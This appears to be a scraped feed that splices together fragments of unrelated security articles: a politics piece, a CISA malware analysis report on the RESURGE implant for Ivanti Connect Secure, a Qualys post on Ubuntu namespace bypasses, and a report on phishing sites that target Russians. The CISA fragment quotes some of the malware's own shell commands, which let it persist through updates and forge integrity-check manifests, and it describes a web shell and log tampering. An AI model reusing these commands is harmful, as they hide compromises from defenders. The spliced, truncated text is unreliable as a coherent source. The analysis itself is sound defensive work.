&lt;p&gt;A &lt;a href="https://www.au.org/the-latest/press/task-force-anti-christian-bias-trump/" rel="noopener" target="_blank"&gt;statement&lt;/a&gt; from &lt;strong&gt;Americans United for Separation of Church and State&lt;/strong&gt; said the task force could lead to religious persecution of those with other faiths.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Rather than protecting religious beliefs, this task force will misuse religious freedom to justify bigotry, discrimination, and the subversion of our civil rights laws,&amp;#8221; said Rachel Laser, the group&amp;#8217;s president and CEO.&lt;/p&gt;
&lt;p&gt;Where is President Trump going with all these blatant attacks on the First Amendment? The president has made no secret of his affection for autocratic leaders and &amp;#8220;strongmen&amp;#8221; around the world, and he is particularly enamored with Hungary&amp;#8217;s far-right &lt;strong&gt;Prime Minister Viktor Orbán&lt;/strong&gt;, who has visited Trump&amp;#8217;s Mar-a-Lago resort twice in the past year.&lt;/p&gt;
&lt;p&gt;A &lt;a href="https://www.theatlantic.com/ideas/archive/2025/03/trumps-press-freedom-hungary-orban/682060/" rel="noopener" target="_blank"&gt;March 15 essay&lt;/a&gt; in The Atlantic by Hungarian investigative journalist &lt;strong&gt;András Pethő&lt;/strong&gt; recounts how Orbán rose to power by consolidating control over the courts, and by building his own media universe while simultaneously placing a stranglehold on the independent press.&lt;/p&gt;
&lt;p&gt;&amp;#8220;As I watch from afar what’s happening to the free press in the United States during the first weeks of Trump’s second presidency — the verbal bullying, the legal harassment, the buckling by media owners in the face of threats — it all looks very familiar,&amp;#8221; Pethő wrote. &amp;#8220;The MAGA authorities have learned Orbán’s lessons well.&amp;#8221;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70660</guid><category>A Little Sunshine</category><category>DOGE</category><category>Latest Warnings</category><category>The Coming Storm</category><category>1st Amendment</category><category>60 Minutes</category><category>ABC News</category><category>Americans United for Separation of Church and State</category><category>András Pethő</category><category>Brendan Carr</category><category>Center for Democracy &amp; Technology</category><category>CNN</category><category>Defense Secretary Pete Hegseth</category><category>Department of Education</category><category>Disney+</category><category>Electronic Frontier Foundation</category><category>Facebook</category><category>Federal Communications Commission</category><category>First Amendment</category><category>Freedom of Information Act</category><category>Gannett</category><category>George Stephanopoulos</category><category>House Speaker Mike Johnson</category><category>Interfaith Alliance</category><category>Jeffrey Goldberg</category><category>Jenner &amp; Block</category><category>Judge Richard Leon</category><category>Kate Ruane</category><category>Marc Elias</category><category>Meta CEO Mark Zuckerberg</category><category>National Security Advisor Michael Waltz</category><category>NPR</category><category>Paramount</category><category>PBS</category><category>President Trump</category><category>Pulitzer Prize board</category><category>Radio Free Asia</category><category>Radio Free Europe / Radio Liberty</category><category>Rev.

&lt;h3&gt;Summary&lt;/h3&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA analyzed three files obtained from a critical infrastructure’s Ivanti Connect Secure device after threat actors exploited Ivanti CVE-2025-0282 for initial access. One file—that CISA is calling RESURGE—has functionality similar to SPAWNCHIMERA in how it creates a Secure Shell (SSH) tunnel for command and control (C2). RESURGE also contains a series of commands that can modify files, manipulate integrity checks, and create a web shell that is copied to the running Ivanti boot disk.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The second file is a variant of SPAWNSLOTH, that was contained within the RESURGE sample. The file tampers with the Ivanti device logs. The third file is a custom embedded binary that contains an open-source shell script and a subset of applets from the open-source tool BusyBox. The open-source shell script allows for ability to extract an uncompressed kernel image (vmlinux) from a compromised kernel image. BusyBox enables threat actors to perform various functions such as download and execute payloads on compromised devices.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;For information on CVE-2025-0282, see CISA Alert &lt;a href="https://www.cisa.gov/news-events/alerts/2025/03/28/cisa-releases-malware-analysis-report-resurge-malware-associated-ivanti-connect-secure" title="CISA Releases Malware Analysis Report on RESURGE Malware Associated with Ivanti Connect Secure"&gt;CISA Releases Malware Analysis Report on RESURGE Malware Associated with Ivanti Connect Secure&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'libdsupgrade.so' is a malicious 32-bit Linux Shared Object file that was extracted from an Ivanti Connect Secure device version 22.7.4.30859. The file contains capabilities of a rootkit, dropper, backdoor, bootkit, proxy, and tunneler. The file shares similar functionality to SPAWNCHIMERA malware however, this file contains a series of commands that modify files, manipulates integrity checks, and creates a web shell that is copied to the running Ivanti boot disk. CISA is calling this variant RESURGE.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The similarities to SPAWNCHIMERA are as follows. RESURGE checks if the file is loaded by a program called 'web' or 'dsmdm' (Figure 1).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;If the 'web' program is called, it hooks accept and strncpy. It contains an embedded private key, which is Exclusive Or (XOR) encrypted, so the Threat Actor (TA) can connect to it with their public key. This proxy does not use encryption, it uses the decoding function (Figure 2). It uses tunneling to look for an Internet Protocol (IP) and data and decodes the data received which will then be funneled through the proxy. The hooked strncpy is modified to limit the copied data to 256 bytes. This is achieved by checking the web program is running within a specified address range, the bytes are not larger than 256, and the bytes do not begin with a specific byte pattern (Figure 3). The TA connects to the tunneler, which can also communicate with the file 'me/runtime/tmp/.logsrv'. When it receives traffic it will funnel to the file, where the TA can then communicate with the system via a secure shell.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;If the 'dsmdm' program is called, it creates a thread for a secure shell via SSH to the system. It doesn't bind to a port but rather binds to a file called 'me/runtime/tmp/.logsrv' and listens for connections, giving the TA a secure socket shell to the system (Figure 4). In order for the TA to access the shell, they need to access the file. Another thread is also created to drop the file 'liblogblock.so' to the '/tmp' directory. It creates a handle to the 'proc' folder, enumerating through it looking for the 'dslogserver' process. It interacts with 'dslogserver' through shared memory to read from or write to the memory it is using. It checks whether the dslogserver is up. If not, it sleeps for 10 seconds and then checks again. This behavior continues in a loop until the server is detected, at which time it will try to load a shared object file called '/tmp/.liblogblock.so' (Figure 5).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;RESURGE contains a series of commands that have been broken down and perform the following functionality:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Commands 1: Inserts itself into 'ld.so.preload', sets up a web shell for remote command execution within the 'compcheckresult.cgi' file, fakes integrity checks, and generates keys against the modified files to sign the manifest file so they appear legitimate (Figure 6).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Commands 2: Decrypts, modifies, and re-encrypts coreboot Random Access Memory (RAM) disk (Figure 7).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;Commands 3: Uses system() to execute several sed commands. These commands modify the contents of two Python files ('scanner.py' and 'scanner_legacy.py') by searching for particular lines and replacing them with new one which, if successful, will result in the scanning scripts no longer keeping track of mismatches or new files (Figure 8).&amp;nbsp;&lt;br /&gt;&lt;br /&gt;---Begin Commands 1---&amp;nbsp;&lt;br /&gt;/bin/sed -i '/echo_console \"Saving package\"/i&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Searches for the string echo_console "Saving package" and enters the following commands before it:&amp;nbsp;&lt;br /&gt;&lt;br /&gt;cp /lib/%s /tmp/data/root/lib&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Copies itself to '/tmp/data/root/lib'.&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;cp /home/venv3/lib/python3.6/site-packages/scanner-0.1-py3.6.egg /tmp/data/root/home/venv3/lib/python3.6/site-packages/scanner-0.1- py3.6.egg&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Copies a Python package 'scanner-0.1-py3.6.egg' to /tmp/data/root/home/venv3/lib/....&amp;nbsp;&lt;br /&gt;&lt;br /&gt;echo "/lib/%s "`/home/bin/openssl dgst -sha256 /lib/%s|cut -d " "-f 2` b\" &amp;gt;&amp;gt; /tmp/data/root/home/etc/manifest/manifest&amp;nbsp;&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;-Calculates a SHA-256 hash for itself using openssl dgst.

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file, 'liblogblock.so', is a 32-bit Linux ELF binary identified as a variant of SPAWNSLOTH malware, a log tampering utility.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;If the program name is dslogserver, it detaches the shared memory containing the "g_do_syslog_servers_exist" IPC key. Next, it obtains the handle to the symbol "_ZN5DSLog4File3addEPKci" and calls 'funchook_create'. Funchook is an open source tool that allows intercepting and modifying function calls at run time. The funchook_create calls funchook_alloc, which eventually calls mmap.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The dissembled functions were renamed with the names in the opensource for readability. The TA had removed log messages in 'funchook_create' to make it difficult to identify the open source tool that was used.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'dsmain' is a 64-bit Linux ELF which contains the open source script 'extract_vmlinux.sh' and the open source tool 'BusyBox'.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;The file takes three arguments (-e, -d, -g). The -e argument is used to encrypt a file with an Advance Encryption Standard (AES) key. The -d argument is used to decrypt a file using an AES key. The -g argument is used to invoke the script 'extract_vmlinux.sh' where it is written to /tmp/extract_vmlinux.sh and is used to extract the uncompressed vmlinux from a kernel image. The TA extracts vmlinux to analyze the kernel’s code, identify vulnerabilities and potentially exploit the system.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;BusyBox is an open-source project tool from a collection of Unix utilities that are widely used by embedded devices and industrial control systems (ICS). When a TA accesses a device running BusyBox, the TA can execute a series of BusyBox commands to perform various functions such as downloading and executing malicious payloads on the compromised device. The file 'dsmain' uses specified applets from BusyBox.&amp;nbsp;&lt;br /&gt;&lt;br /&gt;--Begin Applets Used From BusyBox--&amp;nbsp;&lt;br /&gt;bzcat&amp;nbsp;&lt;br /&gt;bzip2&amp;nbsp;&lt;br /&gt;cat&amp;nbsp;&lt;br /&gt;cpio&amp;nbsp;&lt;br /&gt;find&amp;nbsp;&lt;br /&gt;gunzip&amp;nbsp;&lt;br /&gt;gzip&amp;nbsp;&lt;br /&gt;lzop&amp;nbsp;&lt;br /&gt;sed&amp;nbsp;&lt;br /&gt;sh&amp;nbsp;&lt;br /&gt;strings&amp;nbsp;&lt;br /&gt;tail&amp;nbsp;&lt;br /&gt;tar&amp;nbsp;&lt;br /&gt;touch&amp;nbsp;&lt;br /&gt;tr&amp;nbsp;&lt;br /&gt;unlzma&amp;nbsp;&lt;br /&gt;unlzop&amp;nbsp;&lt;br /&gt;unxz&amp;nbsp;&lt;br /&gt;xxd&amp;nbsp;&lt;br /&gt;xz&amp;nbsp;&lt;br /&gt;--End Applets Used From BusyBox--&lt;/p&gt;

&lt;/table&gt;
&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

RESURGE contains capabilities of the SPAWNCHIMERA[&lt;a class="Hyperlink SCXW26512359 BCX8" href="https://blogs.jpcert.or.jp/en/2025/02/spawnchimera.html" rel="noreferrer noopener" target="_blank"&gt;1&lt;/a&gt;] malware variant, including surviving reboots; however, RESURGE contains distinctive commands that alter its behavior. These commands:&amp;nbsp;&lt;/p&gt;


&lt;ul&gt;
&lt;li&gt;Create a web shell, manipulate integrity checks, and modify files.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Enable the use of web shells for credential harvesting, account creation, password resets, and escalating permissions.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Copy the web shell to the Ivanti running boot disk and manipulate the running coreboot image.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;br /&gt;RESURGE is associated with the exploitation of &lt;a class="Hyperlink SCXW26512359 BCX8" href="https://www.cve.org/CVERecord?id=CVE-2025-0282" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-0282&lt;/a&gt; in Ivanti Connect Secure appliances. CVE-2025-0282 is a stack-based buffer overflow vulnerability in Ivanti Connect Secure, Policy Secure, and ZTA Gateways. CISA added CVE-2025-0282 to its &lt;a class="Hyperlink SCXW26512359 BCX8" href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" rel="noreferrer noopener" target="_blank"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt; on January 8, 2025.&amp;nbsp;&amp;nbsp;&lt;/p&gt;

&lt;p&gt;CISA urges users and administrators to implement the following actions in addition to the &lt;a class="Hyperlink SCXW26512359 BCX8" href="https://www.cisa.gov/cisa-mitigation-instructions-cve-2025-0282" rel="noreferrer noopener" target="_blank"&gt;Mitigation Instructions for CVE-2025-0282&lt;/a&gt;:&amp;nbsp;&lt;/p&gt;


&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;For the highest level of confidence, conduct a factory reset.&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;For Cloud and Virtual systems, conduct a factory reset using an external known clean image of the device.&lt;/strong&gt;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;See Ivanti’s &lt;a class="Hyperlink SCXW26512359 BCX8" href="https://forums.ivanti.com/s/article/Recovery-Steps?language=en_US" rel="noreferrer noopener" target="_blank"&gt;Recommended Recovery Steps&lt;/a&gt; for more information, including how to conduct a factory reset.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Reset credentials of privileged and non-privileged accounts.&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Reset passwords for all domain users and all local accounts, such as Guest, HelpAssistant, DefaultAccount, System, Administrator, and krbtgt. The krbtgt account is responsible for handling Kerberos ticket requests as well as encrypting and signing them. The krbtgt account should be reset twice because the account has a two-password history. The first account reset for the krbtgt needs to be allowed to replicate prior to the second reset to avoid any issues. See CISA’s &lt;a href="https://www.cisa.gov/news-events/analysis-reports/ar21-134a"&gt;Eviction Guidance for Networks Affected by the SolarWinds and Active Directory/M365 Compromise&lt;/a&gt; for more information. Although tailored to Federal Civilian Executive Branch (FCEB) agencies compromised in the 2020 SolarWinds Orion supply chain compromise, the steps are applicable to organizations with Windows AD compromise.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Review access policies to temporarily revoke privileges/access for affected devices. If it is necessary to not alert the attacker (e.g., for intelligence purposes), then privileges can be reduced for affected accounts/devices to “contain” them.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Reset the relevant account credentials or access keys if the investigation finds the threat actor’s access is limited to non-elevated permissions.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;ul&gt;
&lt;li&gt;Monitor related accounts, especially administrative accounts, for any further signs of unauthorized access.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;br /&gt;Organizations should report incidents and anomalous activity related to information found in the malware analysis report to CISA’s 24/7 Operations Center at &lt;a class="Hyperlink SCXW26512359 BCX8" href="mailto:Report@cisa.gov" rel="noreferrer noopener" target="_blank"&gt;Report@cisa.gov&lt;/a&gt; or (888) 282-0870.

Qualys responsibly disclosed these vulnerabilities to the Ubuntu Security Team on January 15, 2025, and has been working with Ubuntu since then.&lt;/p&gt;



&lt;p&gt;Qualys TRU uncovered three distinct bypasses of these namespace restrictions, each enabling local attackers to create user namespaces with full administrative capabilities. These bypasses facilitate exploiting vulnerabilities in kernel components requiring powerful administrative privileges within a confined environment. The restrictions on unprivileged user namespaces were initially introduced in Ubuntu 23.10 and enabled by default in Ubuntu 24.04. It is important to note that these bypasses alone do not enable complete system takeover; however, they become dangerous when combined with other vulnerabilities, typically kernel-related.&lt;/p&gt;



&lt;span id="more-37478"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="what-are-the-user-namespace-in-linux-and-why-are-they-important"&gt;&lt;strong&gt;What are the User Namespace in Linux and Why are they important?&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Most major Linux distributions permit unprivileged users to create namespaces in which they effectively gain full administrative rights. While beneficial for creating containers and sandboxes, this significantly expands the kernel’s attack surface. When new kernel vulnerabilities emerge, namespaces often make these exploitable by unprivileged users. Ubuntu is notably proactive in mitigating such risks by preventing unprivileged users from acquiring capabilities within namespaces.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="affected-ubuntu-versions"&gt;&lt;strong&gt;Affected Ubuntu versions:&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The security bypasses affect Ubuntu version 24.04 and later. Ubuntu 23.10 introduces built-in unprivileged user namespace restrictions, though they are not enabled by default. These protections were introduced in this release, and users who have previously enabled and relied on them are affected.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="technical-details"&gt;&lt;strong&gt;Technical Details&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;You can find the technical details of these security bypasses at:&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt"&gt;https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt&lt;/a&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="leverage-qualys-trurisk-eliminate-to-mitigate-these-risks"&gt;&lt;strong&gt;&lt;strong&gt;Leverage Qualys TruRisk Eliminate to Mitigate These Risks&lt;/strong&gt;&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;To help organizations address these risks quickly, customers leveraging the Qualys agent can use the TruRisk Eliminate module. This module is fully integrated with the VM module to efficiently assign all of the IG QIDs to the team responsible for those Ubuntu servers. It allows the team to test and deploy the mitigation directly from the Qualys console, leveraging the Qualys agent. There is nothing new to install.&lt;/p&gt;



&lt;p&gt;The same researchers who uncovered these Ubuntu bypasses have proactively developed and thoroughly tested those mitigation scripts, ensuring organizations can rapidly and effectively neutralize this new threat.&lt;/p&gt;



&lt;p&gt;If you are not subscribed to the TruRisk Eliminate module, you can visit &lt;a href="https://www.qualys.com/forms/trurisk-eliminate/"&gt;this page&lt;/a&gt; to start a trial or ask your TAM to enable a trial for you.&lt;/p&gt;



&lt;p&gt;Once the TruRisk Eliminate module is enabled, you can address this risk by visit VMDR and Vulnerabilities tab, and select all the vulns on the assets you would like to mitigate this vulnerability on and use Actions-&amp;gt; View Risk Eliminate:&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37479" height="451" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Ubuntu-First-1070x451.png" width="1070" /&gt;&lt;/figure&gt;



&lt;p&gt;Use the Mitigate Now button or multi-select vulnerability and select Actions -&amp;gt; Create Mitigation Job to start a mitigation job that will apply the mitigation to your assets.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37480" height="491" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/03/Ubuntu-Second-1070x491.png" width="1070" /&gt;&lt;/figure&gt;



&lt;p&gt;Note: While this feature can rapidly reduce bypass risk, using it broadly may introduce operational risks or lead to undesired application behavior. We recommend thorough testing in a controlled environment to confirm compatibility and maintain system stability.&lt;/p&gt;



&lt;p&gt;With &lt;a href="https://www.qualys.com/apps/trurisk-eliminate/"&gt;Qualys TruRisk Eliminate&lt;/a&gt;, security teams have an immediate, actionable path to risk reduction.&lt;/p&gt;



&lt;p&gt;This scenario underscores why mitigation should be an essential component of any comprehensive cybersecurity strategy, as it provides a critical layer of defense precisely when patches are absent.&lt;/p&gt;



&lt;p&gt;For more information and details on minimizing the attack surface for these flaws, please visit the Ubuntu&amp;#8217;s post at: &lt;a href="https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction"&gt;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction&lt;/a&gt;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Cybersecurity today requires more than reactive patching—it demands agility and the ability to quickly mitigate vulnerabilities, especially when traditional patching isn&amp;#8217;t feasible. Organizations need proactive methods that allow them to neutralize threats rapidly and effectively, minimizing risk exposure even in complex scenarios. Approaches like virtual patching and real-time mitigations are becoming essential components of a robust cybersecurity strategy.&lt;/p&gt;

But falling for some phishing scams, like those currently targeting Russians searching online for organizations that are fighting the Kremlin war machine, can cost you your freedom or your life.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70811" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70811" height="420" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/legionlibertyarmy.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70811"&gt;The real website of the Ukrainian paramilitary group &amp;#8220;Freedom of Russia&amp;#8221; legion. The text has been machine-translated from Russian.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Researchers at the security firm &lt;strong&gt;Silent Push&lt;/strong&gt; mapped a network of several dozen phishing domains that spoof the recruitment websites of Ukrainian paramilitary groups, as well as Ukrainian government intelligence sites.&lt;/p&gt;
&lt;p&gt;The website &lt;strong&gt;legiohliberty[.]army&lt;/strong&gt; features a carbon copy of the homepage for the &lt;a href="https://en.wikipedia.org/wiki/Freedom_of_Russia_Legion" rel="noopener" target="_blank"&gt;Freedom of Russia Legion&lt;/a&gt; (a.k.a. &amp;#8220;Free Russia Legion&amp;#8221;), a three-year-old Ukraine-based paramilitary unit made up of Russian citizens who oppose Vladimir Putin and his invasion of Ukraine.&lt;/p&gt;
&lt;p&gt;The phony version of that website copies the legitimate site &amp;#8212; &lt;strong&gt;legionliberty[.]army &amp;#8212; &lt;/strong&gt;providing an interactive &lt;strong&gt;Google Form&lt;/strong&gt; where interested applicants can share their contact and personal details. The form asks visitors to provide their name, gender, age, email address and/or Telegram handle, country, citizenship, experience in the armed forces; political views; motivations for joining; and any bad habits.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Participation in such anti-war actions is considered illegal in the Russian Federation, and participating citizens are regularly charged and arrested,&amp;#8221; Silent Push wrote in a report released today. &amp;#8220;All observed campaigns had similar traits and shared a common objective: collecting personal information from site-visiting victims. Our team believes it is likely that this campaign is the work of either Russian Intelligence Services or a threat actor with similarly aligned motives.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Silent Push&amp;#8217;s &lt;strong&gt;Zach Edwards&lt;/strong&gt; said the fake Legion Liberty site shared multiple connections with &lt;strong&gt;rusvolcorps[.]net&lt;/strong&gt;. That domain mimics the recruitment page for a Ukrainian far-right paramilitary group called the &lt;a href="https://en.wikipedia.org/wiki/Russian_Volunteer_Corps" rel="noopener" target="_blank"&gt;Russian Volunteer Corps&lt;/a&gt; (rusvolcorps[.]com), and uses a similar Google Forms page to collect information from would-be members.&lt;/p&gt;
&lt;p&gt;Other domains Silent Push connected to the phishing scheme include: &lt;strong&gt;ciagov[.]icu&lt;/strong&gt;, which mirrors the content on the official website of the &lt;strong&gt;U.S. Central Intelligence Agency&lt;/strong&gt;; and &lt;strong&gt;hochuzhitlife[.]com&lt;/strong&gt;, which spoofs the &lt;strong&gt;Ministry of Defense of Ukraine &amp;amp; General Directorate of Intelligence&lt;/strong&gt; (whose actual domain is &lt;strong&gt;hochuzhit[.]com&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-70814" height="775" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/recruit-form.png" width="749" /&gt;&lt;/p&gt;
&lt;p&gt;According to Edwards, there are no signs that these phishing sites are being advertised via email. Rather, it appears those responsible are promoting them by manipulating the search engine results shown when someone searches for one of these anti-Putin organizations.&lt;/p&gt;
&lt;p&gt;In August 2024, security researcher &lt;strong&gt;Artem Tamoian&lt;/strong&gt; posted &lt;a href="https://x.com/artemtam" rel="noopener" target="_blank"&gt;on Twitter/X&lt;/a&gt; about how he received startlingly different results when he searched for &amp;#8220;Freedom of Russia legion&amp;#8221; in Russia&amp;#8217;s largest domestic search engine &lt;strong&gt;Yandex&lt;/strong&gt; versus Google.com. The top result returned by Google was the legion&amp;#8217;s actual website, while the first result on Yandex was a phishing page targeting the group.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I think at least some of them are surely promoted via search,&amp;#8221; Tamoian said of the phishing domains. &amp;#8220;My first thread on that accuses Yandex, but apart from Yandex those websites are consistently ranked above legitimate in DuckDuckGo and Bing. Initially, I didn&amp;#8217;t realize the scale of it. They keep appearing to this day.&amp;#8221;&lt;span id="more-70785"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Tamoian, a native Russian who left the country in 2019, is the founder of the cyber investigation platform &lt;a href="https://malfors.com" rel="noopener" target="_blank"&gt;malfors.com&lt;/a&gt;. He recently discovered two other sites impersonating the Ukrainian paramilitary groups &amp;#8212; &lt;strong&gt;legionliberty[.]world&lt;/strong&gt; and &lt;strong&gt;rusvolcorps[.]ru&lt;/strong&gt; &amp;#8212; and reported both to Cloudflare. When Cloudflare responded by blocking the sites with a phishing warning, the real Internet address of these sites &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/03/rusvolcorps-stark.png" rel="noopener" target="_blank"&gt;was exposed&lt;/a&gt; as belonging to a known &amp;#8220;bulletproof hosting&amp;#8221; network called &lt;strong&gt;Stark Industries Solutions Ltd&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Stark Industries Solutions appeared two weeks before Russia invaded Ukraine in February 2022, materializing out of nowhere with hundreds of thousands of Internet addresses in its stable &amp;#8212; many of them originally assigned to Russian government organizations. In May 2024, KrebsOnSecurity &lt;a href="https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/" rel="noopener" target="_blank"&gt;published a deep dive on Stark&lt;/a&gt;, which has repeatedly been used to host infrastructure for distributed denial-of-service (DDoS) attacks, phishing, malware and disinformation campaigns from Russian intelligence agencies and pro-Kremlin hacker groups.&lt;/p&gt;
&lt;p&gt;In March 2023, Russia’s Supreme Court designated the Freedom of Russia legion as a terrorist organization, meaning that Russians caught communicating with the group could face between 10 and 20 years in prison.&lt;/p&gt;
&lt;p&gt;Tamoian said those searching online for information about these paramilitary groups have become easy prey for Russian security services.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I started looking into those phishing websites, because I kept stumbling upon news that someone gets arrested for trying to join [the] Ukrainian Army or for trying to help them,&amp;#8221; Tamoian told KrebsOnSecurity. &amp;#8220;I have also seen reports [of] FSB contacting people impersonating Ukrainian officers, as well as using fake Telegram bots, so I thought fake websites might be an option as well.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70810" style="width: 622px;"&gt;&lt;img alt="" class="size-full wp-image-70810" height="802" src="https://krebsonsecurity.com/wp-content/uploads/2025/03/legion-arrests.png" width="612" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70810"&gt;Search results showing news articles about people in Russia being sentenced to lengthy prison terms for attempting to aid Ukrainian paramilitary groups.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Tamoian said &lt;a href="https://en.zona.media/article/2024/10/15/phish-trl" rel="noopener" target="_blank"&gt;reports surface regularly in Russia&lt;/a&gt; about people being arrested for trying carry out an action requested by a &amp;#8220;Ukrainian recruiter,&amp;#8221; with the courts unfailingly imposing harsh sentences regardless of the defendant’s age.&lt;/p&gt;
&lt;p&gt;&amp;#8220;This keeps happening regularly, but usually there are no details about how exactly the person gets caught,&amp;#8221; he said. &amp;#8220;All cases related to state treason [and] terrorism are classified, so there are barely any details.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Tamoian said while he has no direct evidence linking any of the reported arrests and convictions to these phishing sites, he is certain the sites are part of a larger campaign by the Russian government.&lt;/p&gt;
